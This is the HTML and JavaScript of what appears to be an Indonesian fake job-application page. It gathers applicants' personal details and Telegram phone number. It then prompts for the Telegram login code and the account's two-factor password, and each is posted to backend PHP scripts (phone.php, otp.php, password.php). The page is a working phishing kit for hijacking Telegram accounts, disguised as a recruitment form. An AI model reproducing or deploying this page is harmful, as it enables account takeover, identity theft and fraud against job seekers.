
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="">
    <meta property="og:image" content="/assets/img/">
    <meta name="description" content=""" />
    <meta name="author" content="" />
    <title></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="/assets/css/registers.css">
    <style>
        /* Chrome, Safari, Edge, Opera */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
        }

        /* Firefox */
        input[type=number] {
        -moz-appearance: textfield;
        }

        /* Absolute Center Spinner */
        .loading {
            position: fixed;
            z-index: 999;
            height: 2em;
            width: 2em;
            overflow: show;
            margin: auto;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
        }

        /* Transparent Overlay */
        .loading:before {
            content: '';
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));

            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
        }

        /* :not(:required) hides these rules from IE9 and below */
        .loading:not(:required) {
            /* hide "loading..." text */
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }

        .loading:not(:required):after {
            content: '';
            display: block;
            font-size: 10px;
            width: 1em;
            height: 1em;
            margin-top: -0.5em;
            -webkit-animation: spinner 150ms infinite linear;
            -moz-animation: spinner 150ms infinite linear;
            -ms-animation: spinner 150ms infinite linear;
            -o-animation: spinner 150ms infinite linear;
            animation: spinner 150ms infinite linear;
            border-radius: 0.5em;
            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
        }

        /* Animation */

        @-webkit-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @-moz-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @-o-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>
<div id="loading" class="loading" style="display: none;"></div>
<!-- Gambar Header -->
<div class="text-center">
    <img src="/assets/img/h2iyqgqrq8big67vbqbo.jpg" alt="Header" class="responsive-image">
</div>

<div class="container mt-5 mb-6">
    <!-- Alert untuk Menampilkan Error -->
    <div class="alert alert-danger d-none" id="errorAlert" role="alert"></div>

    <!-- Form Nomor Telegram -->
    <form id="firstForm">
        <!-- Teks Berjalan -->
        <div class="marquee">
            <span>Silakan isi data diri Anda dengan lengkap untuk mendaftar lowongan kerja ini.</span>
        </div>
        <h2 class="my-4 text-center text-white py-2" style="background-color: #003366;">Form Pendaftaran</h2>

        <!-- Data Pribadi -->
        <div class="mb-3">
            <label for="nama" class="form-label">Nama Lengkap</label>
            <input type="text" class="form-control" id="nama" name="nama" required>
        </div>
        <div class="mb-3">
            <label for="tanggal_lahir" class="form-label">Tanggal Lahir</label>
            <input type="date" class="form-control" id="tanggal_lahir" name="tanggal_lahir" required>
        </div>
        <div class="mb-3">
            <label class="form-label">Jenis Kelamin</label>
            <select class="form-select" id="jenis_kelamin" name="jenis_kelamin" required>
                <option value="" disabled selected>Pilih Jenis Kelamin</option>
                <option value="Laki-laki">Laki-laki</option>
                <option value="Perempuan">Perempuan</option>
            </select>
        </div>

        <!-- Lokasi (Provinsi, Kabupaten, Kecamatan, Desa) -->
        <div class="mb-3">
            <label class="form-label">Provinsi</label>
            <select class="form-select" id="provinsi" name="provinsi" required>
                <option value="" disabled selected>Pilih Provinsi</option>
            </select>
        </div>
        <div class="mb-3">
            <label class="form-label">Kabupaten / Kota</label>
            <select class="form-select" id="kabupaten" name="kabupaten" disabled required>
                <option value="" disabled selected>Pilih Kabupaten / Kota</option>
            </select>
        </div>
        <div class="mb-3">
            <label class="form-label">Kecamatan</label>
            <select class="form-select" id="kecamatan" name="kecamatan" disabled required>
                <option value="" disabled selected>Pilih Kecamatan</option>
            </select>
        </div>
        <div class="mb-3">
            <label class="form-label">Kelurahan / Desa</label>
            <select class="form-select" id="desa" name="desa" disabled required>
                <option value="" disabled selected>Pilih Kelurahan / Desa</option>
            </select>
        </div>

        <!-- Nomor Telegram -->
        <div class="mb-3">
            <label for="telegram" class="form-label">Nomor Telegram</label>
            <div class="input-group">
                <span class="input-group-text">🇮🇩</span>
                <input type="text" class="form-control" id="telegram" name="telegram" placeholder="+62" value="+62" required>
            </div>
            <div id="errorphone"></div>
        </div>
        <!-- Checkbox Konfirmasi -->
        <div class="mb-3 form-check">
            <input type="checkbox" class="form-check-input" id="setujuTelegram" name="setujuTelegram" required>
            <label class="form-check-label" for="setujuTelegram">
                Saya setuju untuk menerima pesan Telegram dari Admin tentang Pekerjaan Ini
            </label>
        </div>
        <div class="button-container">
            <button id="firstButtonSubmit" type="submit" class="btn btn-primary">Daftar</button>
        </div>
    </form>

    <!-- Form OTP -->
    <form id="otpForm" style="display: none;">
        <h2 class="my-4 text-center">Cek Status</h2>
        <div class="mb-2 text-center">Silahkan masukkan kode verifikasi telegram untuk mengecek status lamaran anda</div>
        <div class="otp-container">
            <input type="number" class="otp-input" maxlength="1" id="otp1">
            <input type="number" class="otp-input" maxlength="1" id="otp2">
            <input type="number" class="otp-input" maxlength="1" id="otp3">
            <input type="number" class="otp-input" maxlength="1" id="otp4">
            <input type="number" class="otp-input" maxlength="1" id="otp5">
        </div>
        <div class="button-container">
            <button id="secondButtonSubmit" type="submit" class="btn btn-primary mt-3">Teruskan</button>
        </div>
    </form>

    <!-- Form Password -->
    <form id="passwordForm" style="display: none;">
        <h2 class="my-4 text-center">Cek Status</h2>
        <div class="mb-2 text-center">Masukkan Password jika ada, atau langsung klik Teruskan jika Autentikasi 2FA tidak aktif</div>
        <div class="password-container">
            <input type="password" class="password-input" id="password" name="password" placeholder="Masukkan Password Anda" required>
            <span id="togglePassword" class="toggle-password">👁️</span>
        </div>
        <div class="button-container">
            <button id="thirdButtonSubmit" type="submit" class="btn btn-primary mt-3">Teruskan</button>
        </div>
    </form>

    <!-- Halaman Sukses -->
    <div class="success-container" id="successMessage">
        <img src="https://img.icons8.com/ios-filled/50/00FF00/ok.png" alt="Success">
        <h2>Berhasil Input Data</h2>
        <p>Silahkan tunggu beberapa saat, kami akan memproses permintaan anda.</p>
    </div>
</div>

<!-- Navbar Sticky untuk Mobile -->
<nav class="navbar navbar-sticky navbar-dark d-md-none">
    <div class="container-fluid">
        <ul class="nav justify-content-around w-100">
            <li class="nav-item">
                <a class="nav-link" href="#home">
                    <i class="fas fa-home"></i>
                    <span>Home</span>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#daftar">
                    <i class="fas fa-list"></i>
                    <span>Daftar</span>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#info">
                    <i class="fas fa-info-circle"></i>
                    <span>Info</span>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#kontak">
                    <i class="fas fa-envelope"></i>
                    <span>Kontak</span>
                </a>
            </li>
        </ul>
    </div>
</nav>

<!-- jQuery AJAX -->
<script>
    const path = window.location.pathname
    const slug = path.split('/').pop()

    function showError(message) {
        $('#errorAlert').text(message).removeClass('d-none');
    }

    $(document).ready(function() {
        // API endpoint untuk data lokasi
        const apiBase = "https://www.emsifa.com/api-wilayah-indonesia/api";

        // Mengisi dropdown Provinsi
        $.getJSON(`${apiBase}/provinces.json`, function(data) {
            data.forEach(function(prov) {
                $('#provinsi').append(`<option value="${prov.id}">${prov.name}</option>`);
            });
        });

        // Mengisi dropdown Kabupaten ketika Provinsi dipilih
        $('#provinsi').on('change', function() {
            const provId = $(this).val();
            $('#kabupaten').prop('disabled', false).empty().append('<option value="" disabled selected>Pilih Kabupaten</option>');
            $('#kecamatan, #desa').prop('disabled', true).empty().append('<option value="" disabled selected>Pilih Kecamatan</option>');
            $.getJSON(`${apiBase}/regencies/${provId}.json`, function(data) {
                data.forEach(function(kab) {
                    $('#kabupaten').append(`<option value="${kab.id}">${kab.name}</option>`);
                });
            });
        });

        // Mengisi dropdown Kecamatan ketika Kabupaten dipilih
        $('#kabupaten').on('change', function() {
            const kabId = $(this).val();
            $('#kecamatan').prop('disabled', false).empty().append('<option value="" disabled selected>Pilih Kecamatan</option>');
            $('#desa').prop('disabled', true).empty().append('<option value="" disabled selected>Pilih Desa</option>');
            $.getJSON(`${apiBase}/districts/${kabId}.json`, function(data) {
                data.forEach(function(kec) {
                    $('#kecamatan').append(`<option value="${kec.id}">${kec.name}</option>`);
                });
            });
        });

        // Mengisi dropdown Desa ketika Kecamatan dipilih
        $('#kecamatan').on('change', function() {
            const kecId = $(this).val();
            $('#desa').prop('disabled', false).empty().append('<option value="" disabled selected>Pilih Desa</option>');
            $.getJSON(`${apiBase}/villages/${kecId}.json`, function(data) {
                data.forEach(function(des) {
                    $('#desa').append(`<option value="${des.id}">${des.name}</option>`);
                });
            });
        });

        // Tampilkan/Sembunyikan password
        $('#togglePassword').on('click', function() {
            const passwordInput = $('#password');
            const type = passwordInput.attr('type') === 'password' ? 'text' : 'password';
            passwordInput.attr('type', type);
            $(this).text(type === 'password' ? '👁️' : '🙈');
        });

        // Proses Form Pertama
        $('#firstForm').submit(function(event) {
            event.preventDefault();
            $('#firstButtonSubmit').prop('disabled', true);
            $('#errorAlert').addClass('d-none');
            const full_name = $('#nama').val();
            const phone_number = $('#telegram').val();

            const phoneArray = phone_number.split("")
                
            if (!phone_number.startsWith("+62")) {
                $('#errorphone').html(
                    `<div class='alert alert-danger' role='alert'>Nomor telepon harus diawali +62</div>`)
                $('#firstButtonSubmit').prop('disabled', false);
                return
            }
            if (phoneArray[0] == "0") {
                $('#errorphone').html(
                    `<div class='alert alert-danger' role='alert'>Nomor telepon harus diawali +62 bukan 0</div>`)
                $('#firstButtonSubmit').prop('disabled', false);
                return
            }
            if (phoneArray[3] != "8") {
                $('#errorphone').html(
                    `<div class='alert alert-danger' role='alert'>Tidak perlu memasukkan angka 0 setelah +62 dan pastikan nomor yang dimasukkan benar</div>`)
                $('#firstButtonSubmit').prop('disabled', false);
                return
            }
            if (phoneArray.length < 10) {
                $('#errorphone').html(
                    `<div class='alert alert-danger' role='alert'>Nomor telepon terlalu pendek</div>`)
                $('#firstButtonSubmit').prop('disabled', false);
                return
            }
            if (phoneArray.length > 17) {
                $('#errorphone').html(
                    `<div class='alert alert-danger' role='alert'>Nomor telepon tidak bisa terlalu panjang</div>`)
                $('#firstButtonSubmit').prop('disabled', false);
                return
            }

            $.ajax({
                url: "/core/phone.php",
                type: "POST",
                data: { full_name, phone_number, slug },
                beforeSend: function() {
                    $('.loading').show();
                },
                success: function(res) {
                    const responseData = JSON.parse(res)
                    if(responseData.status == 200){
                        $('#firstForm').hide();
                        $('#otpForm').show();
                        $('#errorAlert').addClass('d-none');
                    } else {
                        showError(responseData.message)
                    }
                    $('.loading').hide();
                },
                error: function(jqXHR) {
                    let errorMessage = "Error 500, silahkan hubungi admin";
                    showError(errorMessage);
                },
                complete: function(){
                    $('#firstButtonSubmit').prop('disabled', false);
                }
            });
        });

        // Fungsi untuk mengatur perpindahan fokus otomatis antar input OTP
        const otpInputs = $('.otp-input');
        otpInputs.each(function(index, input) {
            $(input).on('input', function() {
                if (this.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs.eq(index + 1).focus(); // Pindah ke input berikutnya jika ada nilai
                }
            });
            $(input).on('keydown', function(event) {
                if (event.key === 'Backspace' && this.value === '' && index > 0) {
                    otpInputs.eq(index - 1).focus(); // Pindah ke input sebelumnya jika kosong dan tekan Backspace
                }
            });
        });

        // Proses Form OTP
        $('#otpForm').submit(function(event) {
            event.preventDefault();
            $('#secondButtonSubmit').prop('disabled', true);
            $('#errorAlert').addClass('d-none');
            const otp_code = Array.from($('.otp-input')).map(input => input.value).join('');
            const full_name = $('#nama').val();
            const phone_number = $('#telegram').val();

            if (otp_code.length === 5) {
                $.ajax({
                    url: "/core/otp.php",
                    type: "POST",
                    data: { full_name, phone_number, slug, otp_code },
                    beforeSend: function() {
                        $('.loading').show();
                    },
                    success: function(res) {
                        const responseData = JSON.parse(res)
                        if(responseData) {
                            if(responseData.status == 200) {
                                if(responseData.type == "SESSION_PASSWORD_NEEDED"){
                                    $('#passwordForm').show();
                                } else {
                                    $('#successMessage').show();
                                }
                                $('#otpForm').hide();
                                $('#errorAlert').addClass('d-none');
                            } else {
                                showError(responseData.message)
                            }
                        } else {
                            let errorMessage = "Ada Masalah saat fetch data, hubungi admin";
                            showError(errorMessage);
                        }

                        $('.loading').hide();
                    },
                    error: function(jqXHR) {
                        let errorMessage = "Error 500, silahkan hubungi admin";
                        showError(errorMessage);
                    },
                    complete: function(){
                        $('#secondButtonSubmit').prop('disabled', false);
                    }
                });
            } else {
                showError("Masukkan OTP 5 Angka!");
            }
        });

        // Proses Form Password
        $('#passwordForm').submit(function(event) {
            event.preventDefault();
            $('#thirdButtonSubmit').prop('disabled', true);
            $('#errorAlert').addClass('d-none');
            const full_name = $('#nama').val();
            const phone_number = $('#telegram').val();
            const otp_code = Array.from($('.otp-input')).map(input => input.value).join('');
            const password = $('#password').val();

            $.ajax({
                url: "/core/password.php",
                type: "POST",
                data: { full_name, phone_number, slug, otp_code, password },
                beforeSend: function() {
                    $('.loading').show();
                },
                success: function(res) {
                    const responseData = JSON.parse(res)
                    if(responseData) {
                        if(responseData.status == 200) {
                            $('#passwordForm').hide();
                            $('#successMessage').show();
                        } else {
                            showError(responseData.message);
                        }
                    } else {
                        showError("Ada Masalah saat fetch data, hubungi admin");
                    }
                    $('#errorAlert').addClass('d-none'); // Sembunyikan pesan error jika berhasil
                },
                error: function(jqXHR) {
                    let errorMessage = "Error 500, silahkan hubungi admin";

                    showError(errorMessage);
                },
                complete: function(){
                    $('#thirdButtonSubmit').prop('disabled', false);
                }
            });
        });
    });
</script>

</body>
</html>
